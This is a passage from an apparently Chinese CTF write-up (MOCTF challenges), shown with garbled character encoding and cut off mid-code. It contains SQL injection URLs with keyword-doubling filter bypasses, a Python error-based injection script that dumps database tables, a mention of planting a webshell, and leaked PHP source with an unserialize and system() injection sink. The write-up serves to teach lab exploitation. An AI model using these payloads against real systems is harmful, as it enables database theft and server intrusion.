class="line">å°Šæ•¬çš„:help_categoryæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:help_keywordæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:help_relationæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:help_topicæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:hostæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:ndb_binlog_indexæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:pluginæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:procæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:procs_privæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:proxies_privæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:serversæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:slow_logæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:tables_privæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:time_zoneæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:time_zone_leap_secondæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:time_zone_nameæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:time_zone_transitionæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:time_zone_transition_typeæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:useræ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:cond_instancesæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:events_waits_currentæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:events_waits_historyæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:events_waits_history_longæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:events_waits_summary_by_instanceæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:events_waits_summary_by_thread_by_event_nameæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:events_waits_summary_global_by_event_nameæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:file_instancesæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:file_summary_by_event_nameæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:file_summary_by_instanceæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:mutex_instancesæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:performance_timersæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:rwlock_instancesæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:setup_consumersæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:setup_instrumentsæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:setup_timersæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:threadsæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:04ad5938eaf0efb6æ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:qqflycaræ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br></pre></td></tr></table></figure><p>å‘ç°å€’æ•°ç¬¬äºŒä¸ªæ¯”è¾ƒå¥‡æ€ª,é‚£ä¹ˆç»§ç»­æå– æå–çš„æ—¶å€™å‘ç°whereè¢«è¿‡æ»¤,åŒå†™ç»•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/ununionion/**/selselectect/**/1,column_name,3/**/frfromom/**/information_schema.columns/**/whwhereere/**/table_name=%2204ad5938eaf0efb6%22%23</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŒå¼•å·æ²¡è¢«è¿‡æ»¤,ç›´æ¥ç”¨åå­—ä¸Šäº†,è¿‡æ»¤äº†çš„è¯å¯ä»¥0x+åå…­è¿›åˆ¶ç»•è¿‡ è¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å°Šæ•¬çš„:saltyfishæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:nameæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:valueæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br></pre></td></tr></table></figure><p>ç»§ç»­ævalue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/ununionion/**/selselectect/**/1,value,3/**/frfromom/**/04ad5938eaf0efb6%23</span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å°Šæ•¬çš„:saltyfishæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:moctf&#123;5o_easy_inj3cTi0n&#125;æ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br></pre></td></tr></table></figure><p>flag:moctf{5o_easy_inj3cTi0n}</p><h3 id="è¦è®¤çœŸ">è¦è®¤çœŸ</h3><p>å‘ç°ä¸€ä¸ªåå°ç™»å½•ç•Œé¢,ç»§ç»­æ‰¾ä¸€æ‰¾,å‘ç°ä¸€ä¸ªurl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.170.143:6003/list.php?id=23</span><br></pre></td></tr></table></figure><p>ç„¶åæµ‹è¯•ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.170.143:6003/list.php?id=23^0</span><br><span class="line">http://119.29.170.143:6003/list.php?id=23^1</span><br></pre></td></tr></table></figure><p>å‘ç°è¿”å›ä¸ä¸€æ · å¤§ç¥æ˜¯ç›²æ³¨,ä½†æ˜¯æˆ‘ç›²æ³¨çš„æ—¶å€™å‡ºäº†ç‚¹é—®é¢˜,è¿™ä¸ªåœ°æ–¹å¡äº†å¥½ä¹…... è¿™ä¸ªåœ°æ–¹è¿‡æ»¤æ‰äº†ç­‰äºå·å’Œwhere,ä½†æ˜¯å¯ä»¥æŠ¥é”™æ³¨å…¥,æ‰€ä»¥æˆ‘æ˜¯æŠ¥é”™æ³¨å…¥åšçš„,æ³¨æ„é—­åˆå®ƒçš„æ‹¬å· å…¶æ¬¡æ³¨æ„æŠ¥é”™æ³¨å…¥æ¯æ¬¡åªèƒ½æå–32ä¸ªå­—ç¬¦,æ‰€ä»¥ä¸€æ¬¡ä¸€æ¬¡æå–,æœ€åä¸€æ¬¡çš„ç»“æœå·²ç»æ— æ‰€è°“äº†,å› ä¸ºæœ‰ç”¨çš„å·²ç»æå‡ºæ¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#list1=[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;,&#x27;, &#x27;_&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    r=requests.get(<span class="string">&quot;http://119.29.170.143:6003/list.php?id=23)%20and%20extractvalue(1,concat(0x3a,substr((select%20group_concat(table_name)%20from%20information_schema.tables),&quot;</span>+<span class="built_in">str</span>(<span class="number">1</span>+num*<span class="number">31</span>)+<span class="string">&quot;,31)))%23&quot;</span>)</span><br><span class="line">    res = re.findall(<span class="string">r&quot;XPATH syntax error: &#x27;:([^&#x27;]+)&#x27;&quot;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(res,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_BUFFER_POOL_STATS,INNODB_LOCK_WAITS,INNODB_CMPMEM,INNODB_CMP,INNODB_LOCKS,INNODB_CMPMEM_RESET,INNODB_CMP_RESET,INNODB_BUFFER_PAGE_LRU,cms_article,cms_category,cms_file,cms_friendlink,cms_message,cms_notice,cms_page,cms_users,columns_priv,db,event,func,general_log,help_category,help_keyword,help_relation,help_topic,host,ndb_binlog_index,plugin,proc,procs_priv,proxies_priv,servers,slow_log,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user,cond_instances,events_waits_current,events_waits_history,events_waits_history_long</span><br></pre></td></tr></table></figure><p>åé¢å¯èƒ½è¿˜ä¼šæœ‰,ä½†æ˜¯å› ä¸ºä¸è¶³32ä¸ªå­—ç¬¦,çˆ†äº†é”™,è¿™é‡Œæˆ‘å°±ä¸ç®¡äº†,å› ä¸ºæœ‰ç”¨çš„cms_userså·²ç»å‡ºæ¥äº†,ç»§ç»­æ³¨å…¥çˆ†åˆ—,å¾—åˆ°äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_SET_NAME,DEFAULT_COLLATE_NAME,DESCRIPTION,MAXLEN,COLLATION_NAME,CHARACTER_SET_NAME,ID,IS_DEFAULT,IS_COMPILED,SORTLEN,COLLATION_NAME,CHARACTER_SET_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT,GRANTEE,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,PRIVILEGE_TYPE,IS_GRANTABLE,ENGINE,SUPPORT,COMMENT,TRANSACTIONS,XA,SAVEPOINTS,EVENT_CATALOG,EVENT_SCHEMA,EVENT_NAME,DEFINER,TIME_ZONE,EVENT_BODY,EVENT_DEFINITION,EVENT_TYPE,EXECUTE_AT,INTERVAL_VALUE,INTERVAL_FIELD,SQL_MODE,STARTS,ENDS,STATUS,ON_COMPLETION,CREATED,LAST_ALTERED,LAST_EXECUTED,EVENT_COMMENT,ORIGINATOR,CHARACTER_SET_CLIENT,COLLATION_CONNECTION,DATABASE_COLLATION,FILE_ID,FILE_NAME,FILE_TYPE,TABLESPACE_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,LOGFILE_GROUP_NAME,LOGFILE_GROUP_NUMBER,ENGINE,FULLTEXT_KEYS,DELETED_ROWS</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®å¾ˆè¿·,å› ä¸ºåº”è¯¥æå–å‡ºä¸€ä¸ªusernameå’Œpasswordåˆ—æ‰å¯¹..ä½†æ˜¯æ²¡æœ‰,åæ¥æˆ‘ç›´æ¥æå–usernameå’Œpasswordæ‹¿åˆ°å¯†ç ,ç„¶ååˆ°åå°ç™»å½•,ä¼ é©¬+nginxè§£ææ¼æ´,æ‹¿åˆ°webshell,ç„¶åå› ä¸ºæ•°æ®åº“ä¸åœ¨è¿™ä¸ªç½‘ç«™,æ‰€ä»¥æˆ‘ä¹Ÿè¿äº†ä¸€ä¸‹æ•°æ®åº“,ç„¶åæä¸€ä¸‹,ä¹Ÿæ²¡æœ‰æå–å‡ºusernameå’Œpasswordåˆ—,åç»­ç ”ç©¶ç ”ç©¶å†è¯´å§... flag:moctf{Y0u_need_to_b3_ser1ous}</p><h3 id="pubg">PUBG</h3><p>é¦–å…ˆindex.php.bakæºç æ³„æ¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;MOCTFåƒé¸¡å¤§èµ›&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt; </span><br><span class="line">a&#123; </span><br><span class="line">    text-decoration:none;</span><br><span class="line">    color:white;</span><br><span class="line">&#125; </span><br><span class="line">body</span><br><span class="line">&#123;</span><br><span class="line">    background:<span class="title function_ invoke__">url</span>(<span class="string">&#x27;image/PUBG.jpg&#x27;</span>);</span><br><span class="line">    background-attachment:fixed;</span><br><span class="line">    background-repeat:no-repeat;</span><br><span class="line">    background-size:cover;</span><br><span class="line">    -moz-background-size:cover;</span><br><span class="line">    -webkit-background-size:cover;</span><br><span class="line">&#125;</span><br><span class="line">center</span><br><span class="line">&#123;</span><br><span class="line">    color:white;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;p&gt;ä½ ç°åœ¨æ­£åœ¨é£æœºä¸Š,è¯·é€‰æ‹©è¦è·³çš„åœ°æ–¹&lt;/p&gt;&lt;/br&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=airport&quot;</span>&gt;æœºåœº&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=school&quot;</span>&gt;å­¦æ ¡&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=field&quot;</span>&gt;æ‰“é‡&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=AFK&quot;</span>&gt;ä¸Šä¸ªå•æ‰€&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>)&amp;&amp;<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>)&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;LandIn&quot;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$pos</span>=<span class="variable">$_GET</span>[<span class="string">&quot;LandIn&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pos</span>===<span class="string">&quot;airport&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;æœºåœºå¤§ä»™å¤ªå¤š,ä½ è¢«æ‰“æ­»äº†~&lt;/center&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$pos</span>===<span class="string">&quot;school&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot;  style=&quot;color:white&quot;&gt;å«æˆ‘æ ¡éœ¸~~&lt;/a&gt;&lt;/center&gt;&#x27;</span>);</span><br><span class="line">            <span class="variable">$pubg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pubg&#x27;</span>];</span><br><span class="line">            <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pubg</span>);</span><br><span class="line">            <span class="comment">// $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$pos</span>===<span class="string">&quot;AFK&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;ç”±äºä½ é•¿æ—¶é—´æ²¡åŠ¨,æ‰åˆ°æµ·é‡Œæ·¹æ­»äº†~&lt;/center&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå»æclass.phpæºç ,å‘ç°class.php.bakæ³„æ¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bag</span>=<span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&quot;M24&quot;</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str=&quot;You got the airdrop&quot;;</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bag=<span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;weapon=<span class="string">&quot;kar98K&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_air_drops</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$method</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$file</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;.//class<span class="subst">$file</span>[0].php&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;php  .//class//<span class="subst">$method</span>.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;php  .//class//win.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nothing</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$this</span>-&gt;bag);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;weapon===<span class="string">&#x27;AWM&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_air_drops</span>(<span class="variable">$this</span>-&gt;bag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;center&gt;The Air Drop is 